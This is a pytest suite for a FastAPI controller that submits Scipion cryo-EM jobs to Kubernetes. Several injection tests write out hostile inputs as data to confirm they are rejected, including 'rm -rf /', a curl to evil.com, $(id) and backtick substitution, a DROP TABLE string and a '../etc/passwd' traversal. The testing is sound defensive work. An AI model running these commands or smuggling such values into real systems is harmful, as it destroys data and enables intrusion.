"""
Job endpoints
=============
"""

import os
import re
import time as _time
from collections import OrderedDict
from pathlib import Path
from types import SimpleNamespace
from typing import Any
from unittest.mock import Mock, patch

from fastapi.testclient import TestClient
from kubernetes.client.exceptions import ApiException

from controller import __version__, create_app
from controller.api.endpoints.jobs import (
    _MAX_KNOWN_JOBS,
    _build_tool_setup,
    _known_jobs,
)
from controller.utilities.config import Settings
from tests.conftest import mock_batch


def test_healthz_ok(client: Any) -> None:
    """Healthz returns 200 with ok."""

    resp = client.get('/healthz')
    assert resp.status_code == 200
    assert b'ok' in resp.content


def test_healthz_content_type(client: Any) -> None:
    """Healthz returns text/plain."""

    resp = client.get('/healthz')
    assert 'text/plain' in resp.headers['content-type']


def test_root_returns_welcome(client: Any) -> None:
    """Root returns welcome message with version."""

    resp = client.get('/')
    assert resp.status_code == 200
    assert __version__.encode() in resp.content
    assert b'Scipion Controller' in resp.content


def test_root_is_plain_text(client: Any) -> None:
    """Root returns text/plain."""

    resp = client.get('/')
    assert 'text/plain' in resp.headers['content-type']


TOOLS = [
    {
        'image': 'harbor.io/xmipp:v1',
        'match': r'^python3',
        'enabled': True,
        'needsGpu': False,
    },
    {
        'image': 'harbor.io/scipion3-remote:v1',
        'match': '.*',
        'enabled': True,
        'needsGpu': False,
    },
]

RELION_TOOLS = [
    {'image': 'harbor.io/relion:v1', 'match': '.*', 'enabled': True, 'needsGpu': False},
]

CTF_TOOLS = [
    {
        'image': 'harbor.io/ctffind4:v1',
        'match': '.*',
        'enabled': True,
        'needsGpu': False,
    },
]


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_submit_success(client: Any, clear_known_jobs: Any) -> None:
    """Job submission succeeds."""

    mock_batch.create_namespaced_job.return_value = None

    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_XmippProtMovieGain/logs/run.db',
        },
    )
    assert resp.status_code == 200
    data = resp.json()
    assert 'jobId' in data
    assert 'jobNumber' in data
    assert data['jobId'].startswith('scipion-job-')
    mock_batch.create_namespaced_job.assert_called_once()


def test_submit_missing_cmd(client: Any) -> None:
    """Submit with missing originalCmd returns 400."""

    resp = client.post('/submit', json={})
    assert resp.status_code == 400
    assert 'originalCmd' in resp.json()['error']


def test_submit_empty_cmd(client: Any) -> None:
    """Submit with empty originalCmd returns 400."""

    resp = client.post('/submit', json={'originalCmd': '   '})
    assert resp.status_code == 400


def test_submit_cmd_injection_blocked(client: Any) -> None:
    """Submit with shell metacharacters in originalCmd returns 400."""

    for payload in [
        'python3 /proj/run.py; rm -rf /',
        'python3 /proj/run.py && curl http://evil.com',
        'python3 /proj/run.py | tee /tmp/out',
        'python3 /proj/run.py `id`',
        'python3 /proj/run.py $(id)',
        "python3 /proj/run.py'; DROP TABLE jobs;--",
    ]:
        resp = client.post('/submit', json={'originalCmd': payload})
        assert resp.status_code == 400, f'Expected 400 for: {payload!r}'
        assert 'invalid characters' in resp.json()['error']


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=[]))
def test_submit_no_matching_tool(client: Any) -> None:
    """Submit with no matching tool returns 422."""

    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_XmippProt/logs/run.db',
        },
    )
    assert resp.status_code == 422


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_submit_with_gpu_resources(client: Any, clear_known_jobs: Any) -> None:
    """Submit with GPU resources sets nvidia.com/gpu limit."""

    mock_batch.create_namespaced_job.return_value = None

    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_XmippProtMovieGain/logs/run.db',
            'resources': {'memoryMb': 8192, 'gpus': 1},
        },
    )
    assert resp.status_code == 200

    job = mock_batch.create_namespaced_job.call_args[0][1]
    container = job.spec.template.spec.containers[0]
    assert 'nvidia.com/gpu' in container.resources.limits


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_submit_records_known_job(client: Any, clear_known_jobs: Any) -> None:
    """Submit records job in _known_jobs."""

    mock_batch.create_namespaced_job.return_value = None
    assert len(_known_jobs) == 0

    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_XmippProtMovieGain/logs/run.db',
        },
    )
    assert resp.status_code == 200
    assert len(_known_jobs) == 1


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_submit_pvc_volumes(client: Any, clear_known_jobs: Any) -> None:
    """PVC mode creates projects-vol and datasets-vol volumes."""

    mock_batch.create_namespaced_job.return_value = None

    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_XmippProtMovieGain/logs/run.db',
        },
    )
    assert resp.status_code == 200

    job = mock_batch.create_namespaced_job.call_args[0][1]
    vol_names = [v.name for v in job.spec.template.spec.volumes]
    assert 'projects-vol' in vol_names
    assert 'datasets-vol' not in vol_names  # onedata_enabled=False in test settings


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_submit_local_storage_mode(client: Any) -> None:
    """Local storage mode creates a hostPath volume."""

    local_settings = Settings(
        namespace='test-ns',
        storage_mode='local',
        local_path='/srv/test',
        toolmap_path='/dev/null',
    )
    local_app = create_app(local_settings)
    mock_batch.create_namespaced_job.return_value = None

    with TestClient(local_app, raise_server_exceptions=False) as c:
        resp = c.post(
            '/submit',
            json={
                'originalCmd': 'python3 Runs/000001_XmippProtMovieGain/logs/run.db',
            },
        )
        assert resp.status_code == 200
        job = mock_batch.create_namespaced_job.call_args[0][1]
        vol_names = [v.name for v in job.spec.template.spec.volumes]
        assert 'projects-local' in vol_names


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=RELION_TOOLS))
def test_submit_relion_setup(client: Any, clear_known_jobs: Any) -> None:
    """Relion protocols get RELION_HOME setup injected."""

    mock_batch.create_namespaced_job.return_value = None

    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000100_ProtRelionRefine3D/logs/run.db',
        },
    )
    assert resp.status_code == 200
    cmd = mock_batch.create_namespaced_job.call_args[0][1].spec.template.spec.containers[0].command[2]
    assert 'RELION_HOME' in cmd


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=CTF_TOOLS))
def test_submit_ctffind_setup(client: Any, clear_known_jobs: Any) -> None:
    """CTFFind protocols get ctffind binary setup."""

    mock_batch.create_namespaced_job.return_value = None

    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000200_CistemProtCTFFind/logs/run.db',
        },
    )
    assert resp.status_code == 200
    cmd = mock_batch.create_namespaced_job.call_args[0][1].spec.template.spec.containers[0].command[2]
    assert 'ctffind' in cmd


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_submit_cleanup_stale_outputs(client: Any, clear_known_jobs: Any) -> None:
    """Stale output cleanup commands are injected."""

    mock_batch.create_namespaced_job.return_value = None

    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_XmippProtMovieGain/logs/run.db',
        },
    )
    assert resp.status_code == 200
    cmd = mock_batch.create_namespaced_job.call_args[0][1].spec.template.spec.containers[0].command[2]
    assert 'CLEANUP' in cmd
    assert 'rm -f' in cmd


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_submit_job_labels(client: Any, clear_known_jobs: Any) -> None:
    """Job gets app=scipion-worker and tool labels."""

    mock_batch.create_namespaced_job.return_value = None

    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_XmippProtMovieGain/logs/run.db',
        },
    )
    assert resp.status_code == 200
    job = mock_batch.create_namespaced_job.call_args[0][1]
    assert job.metadata.labels['app'] == 'scipion-worker'
    assert 'tool' in job.metadata.labels


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_submit_ttl_seconds(client: Any, clear_known_jobs: Any) -> None:
    """Job spec includes ttl_seconds_after_finished from settings."""

    mock_batch.create_namespaced_job.return_value = None

    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_XmippProtMovieGain/logs/run.db',
        },
    )
    assert resp.status_code == 200
    job = mock_batch.create_namespaced_job.call_args[0][1]
    assert job.spec.ttl_seconds_after_finished == 300  # from test settings


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_submit_onedata_sidecar(client: Any) -> None:
    """OneData sidecar is injected when enabled."""

    od_settings = Settings(
        namespace='test-ns',
        onedata_enabled=True,
        oneclient_provider='prov.example.com',
        oneclient_space='my-space',
        toolmap_path='/dev/null',
    )
    od_app = create_app(od_settings)
    mock_batch.create_namespaced_job.return_value = None

    with TestClient(od_app, raise_server_exceptions=False) as c:
        resp = c.post(
            '/submit',
            json={
                'originalCmd': 'python3 Runs/000001_XmippProtMovieGain/logs/run.db',
            },
        )
        assert resp.status_code == 200
        job = mock_batch.create_namespaced_job.call_args[0][1]
        containers = job.spec.template.spec.containers
        assert len(containers) == 2
        assert containers[1].name == 'oneclient'
        vol_names = [v.name for v in job.spec.template.spec.volumes]
        assert 'datasets-vol' in vol_names  # emptyDir created when onedata_enabled=True


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_submit_backoff_limit_zero(client: Any, clear_known_jobs: Any) -> None:
    """Job spec has backoff_limit=0 (no retries)."""

    mock_batch.create_namespaced_job.return_value = None

    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_XmippProtMovieGain/logs/run.db',
        },
    )
    assert resp.status_code == 200
    job = mock_batch.create_namespaced_job.call_args[0][1]
    assert job.spec.backoff_limit == 0


def test_status_running_job(client: Any) -> None:
    """Running job returns RUNNING."""

    job = SimpleNamespace(status=SimpleNamespace(succeeded=0, failed=0, active=1))
    mock_batch.read_namespaced_job.return_value = job

    resp = client.get('/status/12345')
    assert resp.status_code == 200
    assert b'RUNNING' in resp.content


def test_status_done_job_returns_empty(client: Any) -> None:
    """Done job returns empty body."""

    job = SimpleNamespace(status=SimpleNamespace(succeeded=1, failed=0, active=0))
    mock_batch.read_namespaced_job.return_value = job

    resp = client.get('/status/12345')
    assert resp.status_code == 200
    assert resp.content.strip() == b''


def test_status_failed_job_returns_empty(client: Any) -> None:
    """Failed job returns empty body."""

    job = SimpleNamespace(status=SimpleNamespace(succeeded=0, failed=1, active=0))
    mock_batch.read_namespaced_job.return_value = job

    resp = client.get('/status/12345')
    assert resp.status_code == 200
    assert resp.content.strip() == b''


def test_status_not_found_returns_empty(client: Any) -> None:
    """Not found job (404) returns empty body."""

    mock_batch.read_namespaced_job.side_effect = ApiException(status=404, reason='Not Found')

    resp = client.get('/status/99999')
    assert resp.status_code == 200
    assert resp.content.strip() == b''


def test_status_with_full_job_name(client: Any) -> None:
    """Full job name is passed as-is."""

    job = SimpleNamespace(status=SimpleNamespace(succeeded=0, failed=0, active=1))
    mock_batch.read_namespaced_job.return_value = job

    resp = client.get('/status/scipion-job-12345')
    mock_batch.read_namespaced_job.assert_called_with('scipion-job-12345', 'test-ns')
    assert resp.status_code == 200


def test_status_numeric_id_gets_prefix(client: Any) -> None:
    """Numeric ID gets scipion-job- prefix."""

    job = SimpleNamespace(status=SimpleNamespace(succeeded=0, failed=0, active=1))
    mock_batch.read_namespaced_job.return_value = job

    client.get('/status/67890')
    mock_batch.read_namespaced_job.assert_called_with('scipion-job-67890', 'test-ns')


def test_cancel_success(client: Any) -> None:
    """Cancel succeeds."""

    mock_batch.delete_namespaced_job.return_value = None

    resp = client.post('/cancel/12345')
    assert resp.status_code == 200
    assert resp.json()['ok'] is True
    mock_batch.delete_namespaced_job.assert_called_with('scipion-job-12345', 'test-ns', propagation_policy='Background')


def test_cancel_failure(client: Any) -> None:
    """Cancel failure returns 500."""

    mock_batch.delete_namespaced_job.side_effect = Exception('Not found')

    resp = client.post('/cancel/12345')
    assert resp.status_code == 500
    assert resp.json()['ok'] is False


def test_cancel_with_full_name(client: Any) -> None:
    """Cancel with full job name works."""

    mock_batch.delete_namespaced_job.return_value = None

    resp = client.post('/cancel/scipion-job-99999')
    assert resp.status_code == 200
    mock_batch.delete_namespaced_job.assert_called_with('scipion-job-99999', 'test-ns', propagation_policy='Background')


def test_known_jobs_evicts_oldest_when_full(clear_known_jobs: Any) -> None:
    """_known_jobs OrderedDict is capped at _MAX_KNOWN_JOBS."""

    # Insert _MAX_KNOWN_JOBS entries.
    for i in range(_MAX_KNOWN_JOBS):
        _known_jobs[str(i)] = None

    assert len(_known_jobs) == _MAX_KNOWN_JOBS

    # Insert one more oldest ("0") should be evicted.
    _known_jobs['overflow'] = None
    if len(_known_jobs) > _MAX_KNOWN_JOBS:
        _known_jobs.popitem(last=False)

    assert len(_known_jobs) == _MAX_KNOWN_JOBS
    assert '0' not in _known_jobs
    assert 'overflow' in _known_jobs


def test_known_jobs_is_ordered_dict(clear_known_jobs: Any) -> None:
    """_known_jobs is an OrderedDict."""

    assert isinstance(_known_jobs, OrderedDict)


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=CTF_TOOLS))
def test_ctffind_setup_preserves_base_setup(client: Any, clear_known_jobs: Any) -> None:
    """CTFFind tool setup uses += to append, not = to overwrite."""

    mock_batch.create_namespaced_job.return_value = None

    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000200_CistemProtCTFFind/logs/run.db',
        },
    )
    assert resp.status_code == 200
    cmd = mock_batch.create_namespaced_job.call_args[0][1].spec.template.spec.containers[0].command[2]
    # Both CLEANUP (from base setup) and ctffind must be present.
    assert 'CLEANUP' in cmd
    assert 'ctffind' in cmd


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_project_root_shell_injection_semicolon(client: Any) -> None:
    """Semicolon in projectRoot is rejected."""

    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_Xmipp/logs/run.db',
            'projectRoot': '/projects; rm -rf /',
        },
    )
    assert resp.status_code == 400
    assert 'projectRoot' in resp.json()['error']


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_project_root_shell_injection_backtick(client: Any) -> None:
    """Backtick in projectRoot is rejected."""

    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_Xmipp/logs/run.db',
            'projectRoot': '/projects/`whoami`',
        },
    )
    assert resp.status_code == 400


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_project_root_shell_injection_dollar(client: Any) -> None:
    """Dollar in projectRoot is rejected."""

    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_Xmipp/logs/run.db',
            'projectRoot': '/projects/$(id)',
        },
    )
    assert resp.status_code == 400


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_project_root_path_traversal(client: Any) -> None:
    """Path traversal in projectRoot is rejected."""

    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_Xmipp/logs/run.db',
            'projectRoot': '/projects/../etc/passwd',
        },
    )
    assert resp.status_code == 400


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_project_root_valid(client: Any, clear_known_jobs: Any) -> None:
    """Valid projectRoot is accepted."""

    mock_batch.create_namespaced_job.return_value = None
    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_Xmipp/logs/run.db',
            'projectRoot': '/projects/my-project',
        },
    )
    assert resp.status_code == 200


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_namespace_hardening_instance_param_ignored(client: Any, clear_known_jobs: Any) -> None:
    """Submitted jobs always use the configured namespace, ignoring 'instance'."""

    mock_batch.create_namespaced_job.return_value = None
    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_Xmipp/logs/run.db',
            'instance': 'kube-system',
        },
    )
    assert resp.status_code == 200

    call_args = mock_batch.create_namespaced_job.call_args
    assert call_args[0][0] == 'test-ns'


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_run_dir_validation_dollar_rejected(client: Any) -> None:
    """Dollar in run_dir is rejected."""

    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_$(whoami)/logs/run.db',
        },
    )
    assert resp.status_code == 400


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_run_dir_validation_backtick_rejected(client: Any) -> None:
    """Backtick in run_dir is rejected."""

    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_`id`/logs/run.db',
        },
    )
    assert resp.status_code == 400


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_run_dir_validation_semicolon_rejected(client: Any) -> None:
    """Semicolon in run_dir is rejected."""

    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_Xmipp;rm -rf/logs/run.db',
        },
    )
    assert resp.status_code == 400


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_run_dir_validation_normal_passes(client: Any, clear_known_jobs: Any) -> None:
    """Normal run_dir passes validation."""

    mock_batch.create_namespaced_job.return_value = None
    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_XmippProtMovieGain/logs/run.db',
        },
    )
    assert resp.status_code == 200


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_submit_zero_memory_clamped_to_512(client: Any, clear_known_jobs: Any) -> None:
    """Zero memoryMb is clamped to 512."""

    mock_batch.create_namespaced_job.return_value = None
    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_Xmipp/logs/run.db',
            'resources': {'memoryMb': 0},
        },
    )
    assert resp.status_code == 200
    container = mock_batch.create_namespaced_job.call_args[0][1].spec.template.spec.containers[0]
    assert container.resources.limits['memory'] == '512Mi'


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_submit_huge_memory_clamped_to_65536(client: Any, clear_known_jobs: Any) -> None:
    """Huge memoryMb is clamped to 65536."""

    mock_batch.create_namespaced_job.return_value = None
    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/000001_Xmipp/logs/run.db',
            'resources': {'memoryMb': 999999},
        },
    )
    assert resp.status_code == 200
    container = mock_batch.create_namespaced_job.call_args[0][1].spec.template.spec.containers[0]
    assert container.resources.limits['memory'] == '65536Mi'


def test_submit_xmipp_does_not_trigger_relion() -> None:
    """Only one tool-setup block fires per protocol (elif, not if)."""

    cmd = _build_tool_setup('XmippProtMovieGain')
    assert 'Xmipp' in cmd
    assert 'Relion' not in cmd


def test_submit_relion_setup_elif() -> None:
    """Relion setup fires for Relion protocol."""

    cmd = _build_tool_setup('ProtRelionRefine3D')
    assert 'Relion' in cmd
    assert 'Xmipp' not in cmd


def test_submit_ctffind_setup_elif() -> None:
    """CTFFind setup fires for CTFFind protocol."""

    cmd = _build_tool_setup('CistemProtCTFFind')
    assert 'ctffind' in cmd
    assert 'Relion' not in cmd


def test_submit_gctf_setup_elif() -> None:
    """Gctf setup fires for Gctf protocol."""

    cmd = _build_tool_setup('ProtGctf')
    assert 'Gctf' in cmd
    assert 'ctffind' not in cmd


def test_submit_unknown_returns_empty() -> None:
    """Unknown protocol returns empty string."""

    assert _build_tool_setup('SomeUnknownProtocol') == ''


def test_submit_none_returns_empty() -> None:
    """None protocol returns empty string."""

    assert _build_tool_setup(None) == ''


def test_submit_job_ids_differ_in_same_millisecond() -> None:
    """Two IDs generated in rapid succession should differ."""

    fixed_time = 1700000000.123
    ids: list[str] = []
    for _ in range(10):
        with patch.object(_time, 'time', return_value=fixed_time):
            job_id = f'{int(fixed_time * 1000)}-{__import__("os").urandom(3).hex()}'
            ids.append(job_id)
    assert len(set(ids)) == 10, 'All 10 IDs should be unique'


def test_submit_job_id_format() -> None:
    """Job ID matches <timestamp>-<hex> format."""

    job_id = f'{int(_time.time() * 1000)}-{os.urandom(3).hex()}'
    assert re.match(r'^\d+-[0-9a-f]{6}$', job_id)


def test_submit_leading_underscores_stripped() -> None:
    """Leading underscores are stripped from tool label."""

    raw = '___XmippProt'
    label = re.sub(r'[^A-Za-z0-9._-]', '_', raw)[:63].strip('_.-') or 'unknown'
    assert label[0].isalnum()


def test_submit_trailing_underscores_stripped() -> None:
    """Trailing underscores are stripped from tool label."""

    raw = 'Xmipp___'
    label = re.sub(r'[^A-Za-z0-9._-]', '_', raw)[:63].strip('_.-') or 'unknown'
    assert label[-1].isalnum()


def test_submit_all_invalid_chars_returns_unknown() -> None:
    """All invalid chars produce 'unknown' label."""

    raw = '!!@@##'
    label = re.sub(r'[^A-Za-z0-9._-]', '_', raw)[:63].strip('_.-') or 'unknown'
    assert label == 'unknown'


def test_submit_normal_protocol_unchanged() -> None:
    """Normal protocol name is unchanged."""

    raw = 'XmippProtMovieGain'
    label = re.sub(r'[^A-Za-z0-9._-]', '_', raw)[:63].strip('_.-') or 'unknown'
    assert label == 'XmippProtMovieGain'


def test_cancel_404_forwarded(client: Any) -> None:
    """Cancel forwards K8s 404 status."""

    mock_batch.delete_namespaced_job.side_effect = ApiException(status=404, reason='Not Found')
    resp = client.post('/cancel/12345')
    assert resp.status_code == 404
    assert resp.json()['ok'] is False


def test_cancel_409_forwarded(client: Any) -> None:
    """Cancel forwards K8s 409 status."""

    mock_batch.delete_namespaced_job.side_effect = ApiException(status=409, reason='Conflict')
    resp = client.post('/cancel/12345')
    assert resp.status_code == 409


def test_cancel_generic_exception_returns_500(client: Any) -> None:
    """Cancel returns 500 for generic exceptions."""

    mock_batch.delete_namespaced_job.side_effect = RuntimeError('unexpected')
    resp = client.post('/cancel/12345')
    assert resp.status_code == 500
    assert resp.json()['ok'] is False


def test_submit_libnone_script_has_encoding() -> None:
    """patch_libnone.py must use explicit encoding in open() calls."""

    _tools_dir = Path(__file__).parents[4] / 'docker' / 'tools'
    patch_file = _tools_dir / 'common' / 'patch_libnone.py'
    content = patch_file.read_text(encoding='utf-8')

    assert 'encoding="utf-8"' in content or "encoding='utf-8'" in content


def test_status_shell_injection(client: Any) -> None:
    """Status rejects shell injection in job ID."""

    resp = client.get('/status/$(whoami)')
    assert resp.status_code == 400


def test_status_semicolon_injection(client: Any) -> None:
    """Status rejects semicolon injection in job ID."""

    resp = client.get('/status/;rm%20-rf%20/')
    assert resp.status_code == 400


def test_status_uppercase_rejected(client: Any) -> None:
    """Status rejects uppercase job ID."""

    resp = client.get('/status/INVALID-NAME')
    assert resp.status_code == 400


def test_status_too_long_rejected(client: Any) -> None:
    """Status rejects overly long job ID."""

    resp = client.get('/status/' + 'a' * 200)
    assert resp.status_code == 400


def test_cancel_shell_injection(client: Any) -> None:
    """Cancel rejects shell injection in job ID."""

    resp = client.post('/cancel/$(whoami)')
    assert resp.status_code == 400
    assert resp.json()['ok'] is False


def test_cancel_uppercase_rejected(client: Any) -> None:
    """Cancel rejects uppercase job ID."""

    resp = client.post('/cancel/INVALID-NAME')
    assert resp.status_code == 400


def test_cancel_too_long_rejected(client: Any) -> None:
    """Cancel rejects overly long job ID."""

    resp = client.post('/cancel/' + 'a' * 200)
    assert resp.status_code == 400


def test_submit_plain_text_body(client: Any) -> None:
    """POST /submit with non-JSON body returns 400."""

    resp = client.post('/submit', content='not json', headers={'content-type': 'text/plain'})
    assert resp.status_code == 400
    assert 'invalid' in resp.json()['error'].lower() or 'json' in resp.json()['error'].lower()


def test_submit_empty_body(client: Any) -> None:
    """POST /submit with empty body returns 400."""

    resp = client.post('/submit', content='', headers={'content-type': 'application/json'})
    assert resp.status_code == 400


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_submit_string_memory_uses_default(client: Any, clear_known_jobs: Any) -> None:
    """Non-numeric memoryMb uses default."""

    mock_batch.create_namespaced_job.return_value = None
    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/001_XmippProtMovieGain/logs/run.db',
            'resources': {'memoryMb': 'abc'},
        },
    )
    assert resp.status_code == 200


@patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
def test_submit_null_memory_uses_default(client: Any, clear_known_jobs: Any) -> None:
    """Null memoryMb uses default."""

    mock_batch.create_namespaced_job.return_value = None
    resp = client.post(
        '/submit',
        json={
            'originalCmd': 'python3 Runs/001_XmippProtMovieGain/logs/run.db',
            'resources': {'memoryMb': None},
        },
    )
    assert resp.status_code == 200
